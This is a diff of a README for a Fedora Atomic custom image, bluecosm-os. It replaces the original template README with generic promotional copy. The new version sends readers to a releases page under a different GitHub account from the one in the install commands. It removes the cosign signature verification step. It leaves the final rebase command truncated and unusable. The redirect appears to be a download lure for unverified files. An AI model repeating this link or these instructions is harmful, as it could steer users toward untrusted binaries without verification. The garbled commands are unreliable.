@@ -1,43 +1,64 @@
-# bluecosm-os &nbsp; [![bluebuild build badge](https://github.com/mondwind/bluecosm-os/actions/workflows/build.yml/badge.svg)](https://github.com/mondwind/bluecosm-os/actions/workflows/build.yml)
+# 🌌 bluecosm-os - A Simple Linux Operating System
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+## 📥 Download the latest version
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/maanu2043/bluecosm-os/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
+Welcome to bluecosm-os! This is an easy-to-use, Linux-based operating system designed for reliability and simplicity. Follow this guide to download and run bluecosm-os.
 
-## Installation
+## 💻 System Requirements
+Before you start, make sure your computer meets these requirements:
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+- A compatible x86_64 processor
+- At least 2 GB of RAM
+- Minimum of 10 GB free disk space
+- Internet connection for downloading
 
-To rebase an existing atomic Fedora installation to the latest build:
+## 🔗 Download & Install
+To download and install bluecosm-os, visit the following link:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/mondwind/bluecosm-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/mondwind/bluecosm-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+[Download bluecosm-os Releases](https://github.com/maanu2043/bluecosm-os/releases)
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+1. Click on the link above.
+2. Look for the latest release version.
+3. Download the installation file for your system.
 
-## ISO
+After downloading, follow the installation instructions provided in the file or below.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+## 📦 Installation Steps
+If you are using an existing atomic Fedora installation, you can rebase to the latest bluecosm-os build. Follow these steps:
 
-## Verification
+1. **Rebase to the unsigned image** to get the proper signing keys and policies installed. Open your terminal and run:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/mondwind/bluecosm-os:latest
+   ```
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+2. **Reboot your system** to complete the rebase process. Type the following command in the terminal:
+   ```
+   systemctl reboot
+   ```
 
-```bash
-cosign verify --key cosign.pub ghcr.io/mondwind/bluecosm-os
-```
+3. **Finally, rebase to the signed image** using this command:
+   ```
+   rpm-ostree rebase ostree-image-signed:docker
+   ```
+
+## ⚙️ Features
+bluecosm-os offers several features to enhance your experience:
+
+- **User-Friendly Interface:** Navigate effortlessly with a simple and clean design.
+- **Customizable Settings:** Adjust your system according to your needs and preferences.
+- **Regular Updates:** Ensure you have the latest features and security patches.
+- **Robust Security:** Benefit from built-in security protocols to protect your data.
+
+## 📜 Documentation 
+For further information, refer to the [BlueBuild documentation](https://blue-build.org/how-to/setup/) for quick setup instructions. Here you can find additional guidance on setting up your repository based on this template.
+
+## 🐞 Support
+If you encounter any issues, please check the FAQ section in the documentation or reach out to our support community through GitHub.
+
+## 📣 Share Your Feedback
+We value your feedback. Please let us know what you think of bluecosm-os and how we can improve.
+
+## 🔗 Connect With Us
+Stay updated with the latest news and releases by following this GitHub repository. Thank you for choosing bluecosm-os!
